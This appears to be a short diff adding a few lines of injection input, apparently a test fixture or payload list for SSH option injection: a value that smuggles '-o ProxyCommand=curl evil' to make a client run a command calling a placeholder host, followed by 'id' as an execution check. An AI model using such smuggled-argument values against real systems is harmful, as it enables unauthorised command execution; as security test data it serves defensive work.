@@ -1,0 +1,4 @@
+host-e
+-o
+ProxyCommand=curl evil
+id
